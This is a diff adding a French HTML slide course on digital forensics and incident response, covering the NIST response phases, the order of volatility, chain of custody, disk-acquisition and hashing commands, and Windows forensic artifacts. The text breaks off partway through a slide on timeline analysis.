@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Analyste DFIR · Cours Complet · SooPHA Learn</title>
+<style>
+:root {
+  --green:#00ff88; --green-border:rgba(0,255,136,.13);
+  --red:#ff4466; --yellow:#ffd700; --blue:#4488ff; --cyan:#00ddff;
+  --orange:#ff8800; --purple:#aa44ff; --pink:#ff44aa;
+  --bg:#080412; --bg2:rgba(12,4,20,.92);
+  --mono:'Courier New',Courier,monospace;
+  --display:'Georgia','Times New Roman',serif;
+  --body:'Arial',sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{overflow:hidden;height:100%;background:var(--bg);color:#f0e8ff;font-family:var(--body);font-size:14px}
+body::before{content:'';position:fixed;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,var(--purple),#ff44aa,transparent);z-index:999}
+
+#scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px)}
+#vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.7) 100%)}
+canvas#matrix{position:fixed;inset:0;z-index:0;opacity:.04;pointer-events:none}
+
+#topbar{position:fixed;top:3px;left:0;right:0;z-index:200;display:flex;justify-content:space-between;align-items:center;padding:.5rem 1.5rem;background:rgba(8,4,18,.97);border-bottom:1px solid rgba(170,68,255,.13);backdrop-filter:blur(12px);font-size:.65rem;color:rgba(170,68,255,.4)}
+.tb-left{display:flex;gap:1.5rem;align-items:center}
+.tb-right{display:flex;gap:1.2rem;align-items:center}
+.tb-back{color:rgba(170,68,255,.5);text-decoration:none;font-size:.65rem;letter-spacing:.08em;transition:color .2s}.tb-back:hover{color:var(--purple)}
+.tb-dot{width:6px;height:6px;background:var(--purple);border-radius:50%;display:inline-block;animation:blink 1.4s infinite;margin-right:.3rem}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+#progress-top{position:fixed;top:34px;left:0;right:0;z-index:200;height:2px;background:rgba(170,68,255,.06)}
+#progress-fill{height:100%;background:var(--purple);box-shadow:0 0 8px var(--purple);transition:width .5s ease}
+
+#slides{position:fixed;inset:0;z-index:10;padding-top:36px;padding-bottom:44px;overflow:hidden}
+.slide{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:1.5rem 4rem;opacity:0;pointer-events:none;transition:opacity .4s ease,transform .4s ease;transform:translateX(40px);overflow-y:auto}
+.slide.active{opacity:1;pointer-events:all;transform:translateX(0)}
+.slide.exit{opacity:0;transform:translateX(-40px)}
+
+.gabon-bar{display:flex;height:3px;width:60px;border-radius:2px;overflow:hidden;margin:.6rem 0}
+.gabon-bar span:nth-child(1){flex:1;background:#009e60}.gabon-bar span:nth-child(2){flex:1;background:#fcd116}.gabon-bar span:nth-child(3){flex:1;background:#003189}
+.slide-tag{font-family:var(--mono);font-size:.6rem;letter-spacing:.3em;color:rgba(170,68,255,.35);text-transform:uppercase;margin-bottom:.5rem}
+.slide h1{font-family:var(--display);font-weight:900;font-size:clamp(1.8rem,3.5vw,2.8rem);color:#fff;text-align:center;letter-spacing:.1em;line-height:1.15;margin-bottom:.4rem;text-shadow:0 0 40px var(--purple),0 0 80px rgba(170,68,255,.3)}
+.slide h2{font-family:var(--display);font-weight:700;font-size:clamp(1.1rem,2vw,1.7rem);color:var(--purple);letter-spacing:.08em;margin-bottom:1rem}
+.slide h3{font-family:var(--display);font-weight:400;font-size:clamp(.8rem,1.2vw,1rem);color:rgba(170,68,255,.5);letter-spacing:.2em;text-transform:uppercase;margin-bottom:1.5rem}
+@keyframes glitch{0%,90%,100%{text-shadow:0 0 40px var(--purple),0 0 80px rgba(170,68,255,.3)}91%{text-shadow:-3px 0 #ff0044,3px 0 #00ffff;transform:translate(-2px)}93%{text-shadow:3px 0 #ff0044,-3px 0 #00ffff;transform:translate(2px)}95%{text-shadow:0 0 40px var(--purple);transform:translate(0)}}
+.glitch{animation:glitch 7s infinite}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1rem;max-width:880px;width:100%}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:.8rem;max-width:880px;width:100%}
+.card{background:rgba(12,4,20,.9);border:1px solid rgba(170,68,255,.15);border-radius:2px;padding:1.4rem 1.8rem;position:relative;backdrop-filter:blur(10px);max-width:880px;width:100%}
+.card::before{content:'';position:absolute;top:-1px;left:-1px;width:14px;height:14px;border-top:2px solid var(--purple);border-left:2px solid var(--purple)}
+.card::after{content:'';position:absolute;bottom:-1px;right:-1px;width:14px;height:14px;border-bottom:2px solid var(--purple);border-right:2px solid var(--purple)}
+.card-red{border-color:rgba(255,68,102,.18)}.card-red::before,.card-red::after{border-color:var(--red)}
+.card-green{border-color:rgba(0,255,136,.18)}.card-green::before,.card-green::after{border-color:var(--green)}
+.card-blue{border-color:rgba(68,136,255,.18)}.card-blue::before,.card-blue::after{border-color:var(--blue)}
+.card-yellow{border-color:rgba(255,215,0,.18)}.card-yellow::before,.card-yellow::after{border-color:var(--yellow)}
+.card-orange{border-color:rgba(255,136,0,.18)}.card-orange::before,.card-orange::after{border-color:var(--orange)}
+.card-cyan{border-color:rgba(0,221,255,.18)}.card-cyan::before,.card-cyan::after{border-color:var(--cyan)}
+.card-pink{border-color:rgba(255,68,170,.18)}.card-pink::before,.card-pink::after{border-color:var(--pink)}
+
+.blabel{font-family:var(--mono);font-size:.58rem;letter-spacing:.28em;text-transform:uppercase;color:rgba(170,68,255,.4);margin-bottom:.6rem}
+.blabel::before{content:'// ';color:rgba(170,68,255,.2)}
+.bullets{list-style:none;display:flex;flex-direction:column;gap:.55rem}
+.bullets li{display:flex;align-items:flex-start;gap:.7rem;font-family:var(--body);font-size:clamp(.8rem,1.3vw,.92rem);color:rgba(240,232,255,.8);line-height:1.5;animation:fadeIn .4s ease both}
+.bullets li::before{content:'▶';color:var(--purple);font-size:.55rem;margin-top:.35rem;flex-shrink:0}
+.bullets li strong{color:#fff}
+.bullets li.ok::before{content:'✅';font-size:.7rem}
+.bullets li.bad::before{content:'❌';font-size:.7rem}
+.bullets li.warn::before{content:'⚠';color:var(--yellow);font-size:.65rem}
+@keyframes fadeIn{from{opacity:0;transform:translateX(8px)}to{opacity:1;transform:translateX(0)}}
+.bullets li:nth-child(1){animation-delay:.05s}.bullets li:nth-child(2){animation-delay:.12s}.bullets li:nth-child(3){animation-delay:.2s}.bullets li:nth-child(4){animation-delay:.28s}.bullets li:nth-child(5){animation-delay:.36s}.bullets li:nth-child(6){animation-delay:.44s}
+
+.quote{border-left:3px solid var(--purple);padding:.7rem 1rem;background:rgba(170,68,255,.04);font-family:var(--body);font-style:italic;font-size:clamp(.85rem,1.4vw,1rem);color:#f0e8ff;line-height:1.6}
+.quote-red{border-color:var(--red);background:rgba(255,68,102,.04);color:#ffd0d8}
+.quote-yellow{border-color:var(--yellow);background:rgba(255,215,0,.04);color:#fff8d0}
+.quote-green{border-color:var(--green);background:rgba(0,255,136,.04);color:#e0ffe8}
+.quote-orange{border-color:var(--orange);background:rgba(255,136,0,.04);color:#ffe0c0}
+.quote-blue{border-color:var(--blue);background:rgba(68,136,255,.04);color:#d0dcff}
+
+.terminal{background:rgba(4,0,10,.8);border:1px solid rgba(170,68,255,.12);border-left:3px solid var(--purple);padding:.8rem 1.1rem;font-family:var(--mono);font-size:.75rem;color:rgba(170,68,255,.8);line-height:1.8}
+.terminal-red{border-left-color:var(--red);color:rgba(255,68,102,.8)}
+.terminal-green{border-left-color:var(--green);color:rgba(0,255,136,.75)}
+.terminal-yellow{border-left-color:var(--yellow);color:rgba(255,215,0,.75)}
+.terminal-blue{border-left-color:var(--blue);color:rgba(100,160,255,.8)}
+.terminal-orange{border-left-color:var(--orange);color:rgba(255,136,0,.8)}
+.terminal-cyan{border-left-color:var(--cyan);color:rgba(0,221,255,.8)}
+.term-prompt{color:var(--purple)}.term-out{color:rgba(240,232,255,.4)}.term-warn{color:var(--yellow)}.term-err{color:var(--red)}.term-ok{color:var(--green)}
+
+.hdiv{display:flex;align-items:center;gap:1rem;color:rgba(170,68,255,.2);font-size:.62rem;letter-spacing:.2em;margin:.8rem 0;font-family:var(--mono)}
+.hdiv::before,.hdiv::after{content:'';flex:1;height:1px;background:rgba(170,68,255,.1)}
+
+.tag-list{display:flex;flex-wrap:wrap;gap:.35rem}
+.tag{font-family:var(--mono);font-size:.62rem;padding:.22rem .55rem;border:1px solid rgba(170,68,255,.2);background:rgba(170,68,255,.05);color:rgba(170,68,255,.75)}
+.tag-g{border-color:rgba(0,255,136,.14);background:rgba(0,255,136,.04);color:rgba(0,255,136,.65)}
+.tag-r{border-color:rgba(255,68,102,.2);background:rgba(255,68,102,.05);color:rgba(255,68,102,.75)}
+.tag-y{border-color:rgba(255,215,0,.2);background:rgba(255,215,0,.04);color:rgba(255,215,0,.7)}
+.tag-b{border-color:rgba(68,136,255,.2);background:rgba(68,136,255,.05);color:rgba(100,160,255,.8)}
+.tag-o{border-color:rgba(255,136,0,.2);background:rgba(255,136,0,.05);color:rgba(255,136,0,.8)}
+.tag-c{border-color:rgba(0,221,255,.2);background:rgba(0,221,255,.05);color:rgba(0,221,255,.8)}
+
+.sval{font-family:var(--display);font-size:1.4rem;font-weight:700;margin-bottom:.2rem}
+.ssub{font-family:var(--mono);font-size:.6rem;color:rgba(170,68,255,.35);line-height:1.6}
+.arow{display:flex;align-items:flex-start;gap:.6rem}
+.arow .em{font-size:1.1rem;flex-shrink:0;margin-top:.1rem}
+.arow p{font-family:var(--mono);font-size:.64rem;color:rgba(240,232,255,.5);line-height:1.6}
+
+.pill{display:inline-block;padding:.25rem .7rem;font-size:.65rem;border-radius:2px;font-family:var(--mono)}
+.pill-purple{background:rgba(170,68,255,.1);border:1px solid rgba(170,68,255,.3);color:var(--purple)}
+.pill-green{background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:#00ff88}
+.pill-red{background:rgba(255,68,102,.1);border:1px solid rgba(255,68,102,.3);color:#ff4466}
+.pill-yellow{background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.3);color:#ffd700}
+.pill-blue{background:rgba(68,136,255,.1);border:1px solid rgba(68,136,255,.3);color:#4488ff}
+.pill-orange{background:rgba(255,136,0,.1);border:1px solid rgba(255,136,0,.3);color:#ff8800}
+.pill-cyan{background:rgba(0,221,255,.08);border:1px solid rgba(0,221,255,.3);color:#00ddff}
+.pill-pink{background:rgba(255,68,170,.1);border:1px solid rgba(255,68,170,.3);color:var(--pink)}
+
+.cas-badge{display:inline-flex;align-items:center;gap:.4rem;font-family:var(--mono);font-size:.58rem;letter-spacing:.15em;padding:.28rem .8rem;background:rgba(255,68,102,.08);border:1px solid rgba(255,68,102,.22);color:var(--red);margin-bottom:.6rem}
+.step-list{display:flex;flex-direction:column;gap:.5rem}
+.step{display:flex;align-items:flex-start;gap:.7rem}
+.step-num{font-family:var(--mono);font-size:.65rem;color:var(--purple);min-width:1.4rem;padding-top:.05rem;flex-shrink:0}
+.step-txt{font-size:.83rem;color:rgba(240,232,255,.8);line-height:1.5}
+.step-txt strong{color:#fff}
+.timeline{display:flex;flex-direction:column;gap:.45rem}
+.tl-item{display:flex;gap:.8rem;align-items:flex-start}
+.tl-time{font-family:var(--mono);font-size:.6rem;color:var(--purple);min-width:4.2rem;flex-shrink:0;padding-top:.1rem}
+.tl-content{font-size:.82rem;color:rgba(240,232,255,.8);line-height:1.45}
+.tl-content strong{color:#fff}
+
+/* Evidence chain */
+.evidence-chain{display:flex;flex-direction:column;gap:.3rem}
+.ev-row{display:flex;align-items:center;gap:.6rem;padding:.4rem .7rem;font-family:var(--mono);font-size:.62rem;border:1px solid rgba(170,68,255,.12);background:rgba(8,0,16,.5)}
+.ev-hash{color:rgba(170,68,255,.6);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.ev-type{min-width:5rem;color:rgba(240,232,255,.5)}
+.ev-status{min-width:4.5rem}
+.ev-ok{color:var(--green)}.ev-warn{color:var(--yellow)}.ev-bad{color:var(--red)}
+
+#qcm-overlay{position:fixed;inset:0;z-index:300;background:rgba(4,0,12,.97);display:none;flex-direction:column;align-items:center;justify-content:center;padding:2rem}
+#qcm-overlay.show{display:flex;animation:fadeInOv .3s ease}
+@keyframes fadeInOv{from{opacity:0}to{opacity:1}}
+.qcm-box{max-width:680px;width:100%;background:rgba(12,4,24,.97);border:1px solid rgba(0,255,136,.2);border-radius:2px;padding:2.5rem;position:relative;box-shadow:0 0 40px rgba(0,255,136,.08)}
+.qcm-box::before{content:'';position:absolute;top:-1px;left:-1px;width:18px;height:18px;border-top:2px solid #00ff88;border-left:2px solid #00ff88}
+.qcm-box::after{content:'';position:absolute;bottom:-1px;right:-1px;width:18px;height:18px;border-bottom:2px solid #00ff88;border-right:2px solid #00ff88}
+.qcm-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:1px solid rgba(0,255,136,.1)}
+.qcm-label{font-family:var(--mono);font-size:.6rem;letter-spacing:.3em;color:rgba(0,255,136,.4);text-transform:uppercase}
+.qcm-prog{font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.35)}
+.qcm-saving{font-family:var(--mono);font-size:.62rem;color:rgba(0,255,136,.35);margin-bottom:.5rem;display:none}
+.qcm-saving.show{display:block}
+.qcm-question{font-family:var(--display);font-size:clamp(.9rem,1.8vw,1.1rem);font-weight:700;color:#fff;line-height:1.4;margin-bottom:1.8rem}
+.qcm-options{display:flex;flex-direction:column;gap:.65rem;margin-bottom:1.5rem}
+.qcm-option{display:flex;align-items:flex-start;gap:.9rem;padding:.8rem 1.1rem;background:rgba(4,0,12,.4);border:1px solid rgba(0,255,136,.08);cursor:pointer;border-radius:2px;transition:all .15s;font-family:var(--body);font-size:.88rem;color:rgba(220,210,255,.7);line-height:1.4}
+.qcm-option:hover:not(.disabled){border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05);color:rgba(220,255,230,.95)}
+.qcm-option.correct{border-color:#00ff88!important;background:rgba(0,255,136,.1)!important;color:#00ff88!important}
+.qcm-option.wrong{border-color:#ff4466!important;background:rgba(255,68,102,.07)!important;color:#ff4466!important}
+.qcm-option.disabled{cursor:default;pointer-events:none}
+.option-letter{font-family:var(--display);font-size:.68rem;font-weight:700;color:rgba(0,255,136,.4);min-width:18px;flex-shrink:0;margin-top:.1rem}
+.qcm-option.correct .option-letter,.qcm-option.wrong .option-letter{color:inherit}
+.qcm-feedback{padding:.8rem 1rem;border-radius:2px;font-family:var(--mono);font-size:.78rem;line-height:1.5;display:none;margin-bottom:1.2rem}
+.qcm-feedback.correct{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.18);color:rgba(0,255,136,.85)}
+.qcm-feedback.wrong{background:rgba(255,68,102,.05);border:1px solid rgba(255,68,102,.18);color:rgba(255,100,130,.85)}
+.qcm-btn{font-family:var(--display);font-size:.75rem;font-weight:700;letter-spacing:.12em;padding:.7rem 1.8rem;background:#00ff88;color:#020c06;border:none;cursor:pointer;clip-path:polygon(6px 0%,100% 0%,calc(100% - 6px) 100%,0% 100%);transition:all .2s;text-transform:uppercase;display:none}
+.qcm-btn.show{display:inline-block}
+.qcm-btn:hover{background:rgba(0,255,136,.85)}
+
+#completion-modal{position:fixed;inset:0;z-index:400;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;padding:2rem}
+#completion-modal.show{display:flex;animation:fadeInOv .3s ease}
+.completion-box{max-width:500px;width:100%;background:rgba(12,4,24,.98);border:1px solid rgba(0,255,136,.25);border-radius:2px;padding:3rem 2.5rem;text-align:center;box-shadow:0 0 60px rgba(0,255,136,.1);position:relative}
+.completion-box::before{content:'';position:absolute;top:-1px;left:-1px;width:20px;height:20px;border-top:2px solid #00ff88;border-left:2px solid #00ff88}
+.completion-box::after{content:'';position:absolute;bottom:-1px;right:-1px;width:20px;height:20px;border-bottom:2px solid #00ff88;border-right:2px solid #00ff88}
+.completion-icon{font-size:4rem;margin-bottom:1rem}
+.completion-title{font-family:var(--display);font-size:1.5rem;font-weight:900;color:#fff;margin-bottom:.5rem}
+.completion-score{font-family:var(--display);font-size:3.5rem;font-weight:900;color:#00ff88;text-shadow:0 0 30px #00ff88;margin:1rem 0}
+.completion-sub{font-family:var(--mono);font-size:.78rem;color:rgba(0,255,136,.5);margin-bottom:.5rem;line-height:1.6}
+.completion-saved{font-family:var(--mono);font-size:.68rem;color:rgba(0,255,136,.3);margin-bottom:1.5rem}
+.completion-btn{font-family:var(--display);font-size:.78rem;font-weight:700;letter-spacing:.12em;padding:.8rem 1.8rem;text-decoration:none;display:inline-block;clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);cursor:pointer;border:none;margin:.3rem;text-transform:uppercase;transition:all .2s}
+.completion-btn-primary{background:#00ff88;color:#020c06}
+.completion-btn-secondary{background:transparent;color:#00ff88;border:1px solid rgba(0,255,136,.25)!important;clip-path:none;border-radius:2px}
+
+#bottombar{position:fixed;bottom:0;left:0;right:0;z-index:200;display:flex;justify-content:space-between;align-items:center;padding:.5rem 1.5rem;background:rgba(6,2,14,.97);border-top:1px solid rgba(0,255,136,.1);backdrop-filter:blur(12px)}
+.nav-btn{background:transparent;border:1px solid rgba(0,255,136,.18);color:rgba(0,255,136,.5);padding:.32rem .9rem;font-family:var(--mono);font-size:.65rem;cursor:pointer;transition:all .2s;clip-path:polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%)}
+.nav-btn:hover{border-color:#00ff88;color:#00ff88;background:rgba(0,255,136,.05)}
+.nav-btn:disabled{opacity:.2;cursor:not-allowed}
+#slide-counter{font-family:var(--display);font-size:.72rem;color:#00ff88}
+.qcm-indicator{font-family:var(--mono);font-size:.62rem;color:rgba(255,215,0,.5);letter-spacing:.08em}
+@media(max-width:768px){.slide{padding:1rem 1.2rem}.grid2,.grid3{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div id="scanlines"></div>
+<div id="vignette"></div>
+
+<div id="topbar">
+  <div class="tb-left">
+    <a href="dashboard.html" class="tb-back">← Dashboard</a>
+    <span>DFIR — Forensics &amp; Incident Response · Cours Complet</span>
+  </div>
+  <div class="tb-right">
+    <span style="font-family:var(--mono);font-size:.62rem;color:rgba(170,68,255,.4)" id="tb-username">@apprenant</span>
+    <span><span class="tb-dot"></span>SooPHA Learn</span>
+  </div>
+</div>
+<div id="progress-top"><div id="progress-fill" style="width:0%"></div></div>
+
+<div id="slides">
+
+<!-- ■ SLIDE 0 · COVER ── -->
+<div class="slide active" data-index="0">
+  <div class="slide-tag">// Cybersécurité · DFIR · Cours Complet</div>
+  <h1 class="glitch">🔬 ANALYSTE DFIR</h1>
+  <div class="gabon-bar"><span></span><span></span><span></span></div>
+  <h3>Le détective numérique qui reconstitue le crime</h3>
+  <div style="display:flex;gap:.7rem;flex-wrap:wrap;justify-content:center;margin:.8rem 0">
+    <span class="pill pill-purple">🧬 Forensics disque</span>
+    <span class="pill pill-blue">🧠 Analyse mémoire RAM</span>
+    <span class="pill pill-red">🔴 Incident Response</span>
+    <span class="pill pill-yellow">🔍 Timeline analysis</span>
+    <span class="pill pill-orange">🦠 Malware triage</span>
+  </div>
+  <div style="max-width:720px;width:100%;margin-top:.5rem" class="card">
+    <div style="display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-bottom:.8rem">
+      <div style="text-align:center"><div class="sval" style="color:var(--red);font-size:2rem">277j</div><div class="ssub">délai moyen de détection<br>d'une intrusion<br>· IBM 2023</div></div>
+      <div style="text-align:center"><div class="sval" style="color:var(--purple);font-size:2rem">50K€</div><div class="ssub">salaire junior<br>analyste DFIR<br>France · progression rapide</div></div>
+      <div style="text-align:center"><div class="sval" style="color:var(--green);font-size:2rem">750€</div><div class="ssub">TJM moyen<br>expert IR freelance<br>mission sur incident</div></div>
+    </div>
+    <div class="terminal">
+      <span class="term-prompt">dfir@soopha:~$ </span>
+      <span class="term-out">// "L'attaquant détruit les preuves. Le forensicien les ressuscite."</span>
+    </div>
+  </div>
+  <div style="margin-top:1rem;font-size:.68rem;color:rgba(170,68,255,.25);letter-spacing:.15em">← → POUR NAVIGUER · ESPACE POUR AVANCER</div>
+</div>
+
+<!-- ■ SLIDE 1 · ÉCOSYSTÈME ── -->
+<div class="slide" data-index="1" data-qcm="1">
+  <div class="slide-tag">// 01 · Cartographie</div>
+  <h2>L'écosystème DFIR : Digital Forensics &amp; Incident Response</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">DFIR — Les deux disciplines</div>
+        <div style="display:flex;gap:.7rem;margin-bottom:.6rem">
+          <div style="flex:1;background:rgba(170,68,255,.05);border:1px solid rgba(170,68,255,.15);padding:.8rem;border-radius:2px">
+            <div style="font-family:var(--mono);font-size:.6rem;color:var(--purple);margin-bottom:.4rem">🔬 DIGITAL FORENSICS</div>
+            <p style="font-size:.78rem;color:rgba(240,232,255,.7);line-height:1.4">Science de la <strong>collecte et l'analyse de preuves numériques</strong>. Reconstituer ce qui s'est passé après un incident. Disque, RAM, réseau, cloud. Recevable en justice.</p>
+          </div>
+          <div style="flex:1;background:rgba(255,68,102,.05);border:1px solid rgba(255,68,102,.15);padding:.8rem;border-radius:2px">
+            <div style="font-family:var(--mono);font-size:.6rem;color:var(--red);margin-bottom:.4rem">🚨 INCIDENT RESPONSE</div>
+            <p style="font-size:.78rem;color:rgba(240,232,255,.7);line-height:1.4">Processus de <strong>réponse en temps réel</strong> à une attaque. Contenir, éradiquer, rétablir et tirer les leçons. Limiter l'impact business et éviter la récidive.</p>
+          </div>
+        </div>
+        <div class="terminal" style="font-size:.64rem">
+          <span class="term-prompt">// </span><span class="term-out">Forensics = le passé → IR = le présent.<br>Les deux ensemble = DFIR.</span>
+        </div>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Les 6 phases du cycle IR (NIST SP 800-61)</div>
+        <div class="terminal terminal-yellow" style="font-size:.64rem;line-height:2">
+          <span class="term-warn">01 Préparation     </span><span class="term-out">Plans, outils, équipe, runbooks</span><br>
+          <span class="term-warn">02 Détection       </span><span class="term-out">SIEM, EDR, alertes, signalement</span><br>
+          <span class="term-warn">03 Analyse         </span><span class="term-out">Qualification, scope, timeline</span><br>
+          <span class="term-warn">04 Containment     </span><span class="term-out">Isolation — sans éteindre</span><br>
+          <span class="term-warn">05 Éradication     </span><span class="term-out">Supprimer la persistance, patcher</span><br>
+          <span class="term-warn">06 Post-incident   </span><span class="term-out">Rapport, leçons, amélioration</span>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Les 4 sources de preuves numériques</div>
+        <ul class="bullets" style="gap:.4rem">
+          <li><strong>Disque / Storage</strong> — Fichiers, MFT, journaux NTFS, LNK, prefetch, registre Windows, historiques shell. Persistant mais modifiable.</li>
+          <li><strong>Mémoire RAM</strong> — Processus actifs, connexions réseau, credentials en mémoire, clés de chiffrement, injections. <strong>Volatile</strong> — disparaît à l'extinction.</li>
+          <li><strong>Réseau / PCAP</strong> — Trafic capturé, flux NetFlow, logs firewall, DNS, proxy. Reconstituer les communications C2.</li>
+          <li><strong>Logs &amp; Cloud</strong> — Logs Windows Event, Syslog, CloudTrail, Entra ID Audit. Source de vérité chronologique.</li>
+        </ul>
+      </div>
+      <div class="card card-red">
+        <div class="blabel" style="color:rgba(255,68,102,.4)">Ordre de volatilité — RFC 3227</div>
+        <p style="font-size:.82rem;color:rgba(240,232,255,.8);line-height:1.5;margin-bottom:.5rem">Toujours collecter <strong>du plus volatile au moins volatile</strong>. Une preuve perdue est perdue pour toujours.</p>
+        <div class="terminal terminal-red" style="font-size:.63rem;line-height:1.9">
+          <span style="color:var(--red)">1. RAM / Registres CPU  </span><span class="term-out">→ secondes</span><br>
+          <span style="color:var(--orange)">2. Cache / ARP / routing </span><span class="term-out">→ minutes</span><br>
+          <span style="color:var(--yellow)">3. Processus / connexions</span><span class="term-out">→ variable</span><br>
+          <span class="term-out">4. Disque local           </span><span class="term-out">→ jours</span><br>
+          <span class="term-out">5. Logs distants / cloud  </span><span class="term-out">→ semaines</span><br>
+          <span class="term-out">6. Archives / sauvegardes </span><span class="term-out">→ mois/années</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 2 · FONDAMENTAUX ── -->
+<div class="slide" data-index="2" data-qcm="2">
+  <div class="slide-tag">// 02 · Fondamentaux</div>
+  <h2>Les piliers de la forensics numérique</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">⛓ Chaîne de custody — l'intégrité des preuves</div>
+        <div class="quote" style="margin-bottom:.6rem;font-size:.82rem">Une preuve numérique sans chaîne de custody est irrecevable devant un tribunal. Si tu ne peux pas prouver que tu ne l'as pas modifiée, elle ne vaut rien.</div>
+        <div class="step-list">
+          <div class="step"><span class="step-num">01</span><div class="step-txt"><strong>Hash avant acquisition</strong> — MD5 + SHA-256 du support original. C'est l'empreinte de référence.</div></div>
+          <div class="step"><span class="step-num">02</span><div class="step-txt"><strong>Acquisition sur support vierge</strong> — Image bit-à-bit avec write blocker hardware. Jamais sur l'original.</div></div>
+          <div class="step"><span class="step-num">03</span><div class="step-txt"><strong>Hash de l'image</strong> — Doit être identique au hash original. Preuve d'intégrité.</div></div>
+          <div class="step"><span class="step-num">04</span><div class="step-txt"><strong>Documentation</strong> — Qui, quoi, quand, où, comment. Chaque action horodatée et signée.</div></div>
+        </div>
+        <div class="evidence-chain" style="margin-top:.6rem">
+          <div class="ev-row"><span class="ev-type">Original</span><span class="ev-hash">SHA256: a3f4b2c1d8e9f0...</span><span class="ev-status ev-ok">✓ Ref</span></div>
+          <div class="ev-row"><span class="ev-type">Image .dd</span><span class="ev-hash">SHA256: a3f4b2c1d8e9f0...</span><span class="ev-status ev-ok">✓ Conforme</span></div>
+          <div class="ev-row"><span class="ev-type">Copie travail</span><span class="ev-hash">SHA256: a3f4b2c1d8e9f0...</span><span class="ev-status ev-ok">✓ Conforme</span></div>
+        </div>
+      </div>
+      <div class="card card-orange">
+        <div class="blabel" style="color:rgba(255,136,0,.4)">Outils d'acquisition</div>
+        <div class="tag-list">
+          <span class="tag tag-o">dd / dcfldd · Linux</span>
+          <span class="tag tag-o">FTK Imager · Windows</span>
+          <span class="tag tag-o">Guymager · GUI Linux</span>
+          <span class="tag tag-o">WinPmem · RAM dump</span>
+          <span class="tag tag-o">DumpIt · RAM Windows</span>
+          <span class="tag tag-o">LiME · RAM Linux kernel</span>
+        </div>
+        <div class="terminal terminal-orange" style="font-size:.63rem;line-height:1.8;margin-top:.6rem">
+          <span class="term-out"># Acquisition disque bit-à-bit</span><br>
+          <span style="color:var(--orange)">dd</span><span class="term-out"> if=/dev/sda of=disk.dd bs=4M conv=noerror,sync</span><br>
+          <span class="term-out"># Hash de vérification</span><br>
+          <span style="color:var(--orange)">sha256sum</span><span class="term-out"> /dev/sda > hash_original.txt</span><br>
+          <span style="color:var(--orange)">sha256sum</span><span class="term-out"> disk.dd > hash_image.txt</span><br>
+          <span style="color:var(--orange)">diff</span><span class="term-out"> hash_original.txt hash_image.txt</span>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Artefacts Windows clés — ce que l'attaquant laisse</div>
+        <div class="terminal terminal-blue" style="font-size:.63rem;line-height:1.95">
+          <span style="color:var(--blue)">Prefetch        </span><span class="term-out">→ Programmes exécutés (C:\Windows\Prefetch)</span><br>
+          <span style="color:var(--blue)">LNK Files       </span><span class="term-out">→ Fichiers récemment ouverts</span><br>
+          <span style="color:var(--blue)">Jump Lists      </span><span class="term-out">→ Fichiers et apps récentes par utilisateur</span><br>
+          <span style="color:var(--blue)">MFT             </span><span class="term-out">→ Métadonnées de TOUS les fichiers NTFS</span><br>
+          <span style="color:var(--blue)">Registre SYSTEM </span><span class="term-out">→ Services, autoruns, USB connectés</span><br>
+          <span style="color:var(--blue)">SAM / SECURITY  </span><span class="term-out">→ Hashes de mots de passe locaux</span><br>
+          <span style="color:var(--blue)">Event Logs      </span><span class="term-out">→ 4624 login, 4688 process, 4698 task</span><br>
+          <span style="color:var(--blue)">Amcache.hve     </span><span class="term-out">→ Exécutables récents + hash SHA-1</span><br>
+          <span style="color:var(--blue)">ShimCache       </span><span class="term-out">→ Historique d'exécution de programmes</span>
+        </div>
+      </div>
+      <div class="card card-purple" style="border-color:rgba(170,68,255,.2)">
+        <div class="blabel">Timeline analysis — la clé de toute investigation</div>
+        <p style="font-size:.82rem;color:rgba(240,232,255,.8);line-height:1.5;margin-bottom:.5rem">Reconstituer une <strong>chronologie unifiée</strong> de tous les événements : logs système, accès fichiers, connexions réseau, events Windows. Identifier le <em>patient zéro</em> et l'ordre exact des actions.</p>
+        <div class="tag-list">
+          <span class="tag">log2timeline · plaso</span>
+          <span class="tag">Timesketch</span>
+          <span class="tag">Hayabusa</span>
+          <span class="tag">Eric Zimmerman Tools</span>
+        </div>
+        <div class="terminal" style="font-size:.63rem;margin-top:.6rem">
+          <span class="term-out"># Générer une timeline unifiée avec plaso</span><br>
